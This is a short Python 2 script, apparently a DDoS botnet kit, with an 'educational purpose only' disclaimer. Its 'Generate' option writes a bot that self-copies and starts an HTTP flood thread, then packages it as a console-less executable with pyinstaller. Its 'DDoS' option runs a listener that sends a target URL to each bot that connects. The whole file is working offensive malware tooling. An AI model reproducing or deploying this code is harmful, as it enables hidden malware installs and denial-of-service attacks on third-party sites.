import socket
import sys
import os, subprocess


"""
Educational purpose only             
---------------------------------------------
I'm not responsible for your actions 

Created By: EH30
"""

if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")
elif sys.platform == "darwin":
    os.system("clear")
else:
    print ("Unknown System")


def listener():
    host = raw_input("\033[1;32m Host: \033[1;m")
    port = input("\033[1;32m port: \033[1;m")
    while True:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.bind((host, port))
        soc.listen(0)
        conn, addr = soc.accept()
        url = raw_input("\033[1;32m URL: \033[1;m")
        conn.send(url)


def generate():
    user_input = raw_input("\033[1;32m File Name: \033[1;m")
    user_host = raw_input("\033[1;32m Host: \033[1;m")
    user_port = input("\033[1;32m Port: \033[1;m")
    mix = "var = mainlib.Bot('{0}', {1})\n".format(user_host, user_port)

    with open(user_input, "w+") as opnr:
        opnr.write("import mainlib\n")
        opnr.write(mix)
        opnr.write("var.selfcopy()\n")
        opnr.write("var.HttpTh()\n")
        opnr.close()

    subprocess.call(["pyinstaller", "--onefile", "--noconsole", user_input])


def usage():
    menu = """
    \033[1;32m
        1)Generate
        2)DDoS
        \033[1;m
        """
    print (menu)


usage()

user = raw_input("\033[1;32m> \033[1;m")

if user == '1':
    generate()
elif user == '2':
    listener()
else:
    print ("ERROR")
